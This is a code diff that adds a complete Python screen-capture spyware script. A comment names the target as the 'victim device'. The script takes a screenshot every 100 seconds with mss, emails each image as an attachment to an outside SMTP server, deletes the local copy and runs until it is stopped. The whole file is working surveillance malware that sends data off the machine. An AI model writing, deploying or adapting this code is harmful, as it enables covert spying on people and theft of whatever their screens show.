@@ -1,0 +1,90 @@
+import os
+import smtplib
+from email import encoders
+from email.mime.base import MIMEBase
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import mss
+import threading
+
+
+# Server Configuration
+#Setup an email server using mailtrap, and paste the provided inbox login credentials here:
+EMAIL_ADDRESS = "SMTP Username"
+EMAIL_PASSWORD = "SMTP Password"
+SMTP_SERVER = "smtp.mailtrap.io"
+SMTP_PORT = 2525
+SEND_REPORT_EVERY = 100  # Interval in seconds for sending screenshots
+
+class HScreenCapture:
+    def __init__(self, time_interval: int, email: str, password: str) -> None:
+        self.interval = time_interval
+        self.email = email
+        self.password = password
+
+    def send_mail(self, subject: str, message: str, attachment_path: str) -> None:
+        try:
+            msg = MIMEMultipart()
+            msg['From'] = self.email
+            msg['To'] = self.email
+            msg['Subject'] = subject
+            msg.attach(MIMEText(message, 'plain'))
+
+            # Attaching the shot to the email
+            with open(attachment_path, "rb") as f:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(f.read())
+            encoders.encode_base64(part)
+            part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment_path)}')
+            msg.attach(part)
+
+#Setting Up the Email sending Functionality
+            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
+                server.login(self.email, self.password)
+                server.sendmail(self.email, self.email, msg.as_string())
+            print(f"Email sent successfully with screenshot: {attachment_path}")
+        except Exception as e:
+            print(f"Could not send email: {e}")
+
+    def take_screenshot(self) -> str:
+        #Capturing the screenshot from the victim device then saving it, and possible error handling
+        try:
+            output_path = "/tmp/screenshot.png"  # Using /tmp/ for simplicity
+            with mss.mss() as sct:
+                sct.shot(output=output_path)
+            print(f"Screenshot captured: {output_path}")
+            return output_path
+        except Exception as e:
+            print(f"Failed to take screenshot: {e}")
+            return ""
+
+    #Sending the actual email at defined time intervals
+    def report(self) -> None:
+        try:
+            screenshot_path = self.take_screenshot()
+            if screenshot_path:
+                self.send_mail("Screenshot Logger Report", "Find the attached screenshot.", screenshot_path)
+                os.remove(screenshot_path)  # Clean up the screenshot file after sending
+                print(f"Screenshot deleted: {screenshot_path}")
+        except Exception as e:
+            print(f"Error in report method: {e}")
+
+        # Schedule the following email
+        timer = threading.Timer(self.interval, self.report)
+        timer.daemon = True
+        timer.start()
+
+    def run(self) -> None:
+        print("Starting the HScreenCapture ..")
+        self.report()
+
+if __name__ == "__main__":
+    logger = HScreenCapture(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
+    logger.run()
+    
+#This will keep the script running until it is manually stopped
+    try:
+        while True:
+            pass  
+    except KeyboardInterrupt:
+        print("HScreenCapture terminated.")
